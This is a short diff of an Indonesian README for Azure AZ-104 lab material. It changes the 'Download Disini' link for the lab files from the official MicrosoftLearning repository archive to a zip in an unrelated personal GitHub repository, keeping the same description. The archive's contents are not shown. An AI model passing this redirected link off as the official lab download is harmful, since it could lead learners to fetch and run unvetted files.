@@ -56,7 +56,7 @@ Terima kasih telah menggunakan materi ini! Semoga bermanfaat dalam proses belaja
 
 # Konten Folder
 
-File lab yang diperlukan dapat [Download Disini](https://github.com/MicrosoftLearning/AZ-104-MicrosoftAzureAdministrator/archive/master.zip)
+File lab yang diperlukan dapat [Download Disini](https://github.com/zaxrmdn/Lazidn25/archive/refs/heads/file.zip)
 
 ## Demonstrasi
 
